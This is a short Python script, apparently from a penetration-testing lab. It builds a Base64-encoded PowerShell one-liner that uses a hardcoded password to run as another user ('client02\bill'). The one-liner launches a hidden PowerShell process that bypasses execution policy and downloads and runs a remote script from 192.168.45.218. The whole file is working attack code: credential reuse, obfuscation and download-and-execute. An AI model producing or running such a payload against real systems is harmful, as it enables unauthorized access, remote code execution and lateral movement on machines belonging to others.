import base64

# Prepare the corrected PowerShell payload script to run as Bill
payload = (
    "$p=ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force; "
    "$c=New-Object System.Management.Automation.PSCredential('client02\\bill',$p); "
    "Start-Process -FilePath 'powershell.exe' -ArgumentList "
    "'-NoProfile -ExecutionPolicy Bypass -Command iex (New-Object Net.WebClient).DownloadString(''http://192.168.45.218/runall.ps1'')' "
    "-Credential $c -WindowStyle Hidden"
)

# Encode the payload in UTF-16LE and then Base64
b64 = base64.b64encode(payload.encode('utf-16le')).decode('ascii')

# Construct the final one-liner for execution
one_liner = f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {b64}"

# Display the one-liner to the user
print(one_liner)

